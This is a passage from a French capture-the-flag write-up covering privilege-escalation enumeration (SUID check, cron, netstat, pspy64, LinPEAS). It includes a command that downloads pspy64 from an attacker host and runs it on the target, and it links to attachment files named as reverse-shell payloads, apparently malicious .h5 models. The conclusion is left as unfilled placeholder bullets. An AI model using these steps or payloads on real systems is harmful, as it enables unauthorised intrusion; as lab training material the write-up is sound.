python3 suid3num.py
```
L’outil confirme que :

- tous les binaires SUID présents sont standards
- aucun binaire personnalisé n’est identifié
- aucun binaire exploitable via GTFOBins n’est détecté
  

Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.

### Inspection des tâches cron
Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.

Les crons système peuvent être consultés avec :

```bash
cat /etc/crontab
```

### Analyse des services locaux
Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.

```
netstat -tulpn
```

### pspy64
Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.

Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :

cd /var/tmp
wget http://10.10.x.x:8000/pspy64
chmod +x pspy64
./pspy64

L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.

Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.

### Conclusion de l’énumération manuelle

### Analyse avec linpeas.sh
Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)

---

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes 

## Pièces jointes

### Modèles `.h5`

- <a href="files/poc-ping.h5" download>poc-ping.h5</a>  
- <a href="files/poc-touch.h5" download>poc-touch.h5</a>  
- <a href="files/reverse-shell.h5" download>reverse-shell.h5</a>  
- <a href="files/minimal.h5" download>minimal.h5</a>  

### Scripts Python

- <a href="files/poc-ping.py" download>poc-ping.py</a>  
- <a href="files/poc-touch.py" download>poc-touch.py</a>  
- <a href="files/reverse-shell.py" download>reverse-shell.py</a>  
- <a href="files/minimal.py" download>minimal.py</a>  
- <a href="files/test_model.py" download>test_model.py</a>

---

{{< feedback >}}